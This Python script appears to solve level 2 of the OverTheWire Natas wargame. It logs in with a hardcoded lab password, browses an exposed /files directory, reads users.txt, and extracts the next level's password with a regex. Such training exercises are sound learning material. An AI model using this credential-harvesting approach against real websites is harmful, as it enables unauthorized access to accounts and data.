#!/usr/bin/env python

import requests
import re

user = 'natas2'
passw = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user




# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''
# OUTCOME:  we found that there is another folder called files, let's search there


# 2nd Step:  investigate the /files directory 
'''
url = 'http://%s.natas.labs.overthewire.org/files' % user
r = requests.get(url, auth=(user, passw))
print(r.text)
'''
# OUTCOME: there is a users.txt file, let's see what's inside


# 3rd Step:  investigate the /users.txt file 
'''
url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % user
r = requests.get(url, auth=(user, passw))
print(r.text)		
'''
# OUTCOME:  there is the password



# 4th Step:  extract the password from the sourcecode
#'''
url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % user
r = requests.get(url, auth=(user, passw))
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
#'''


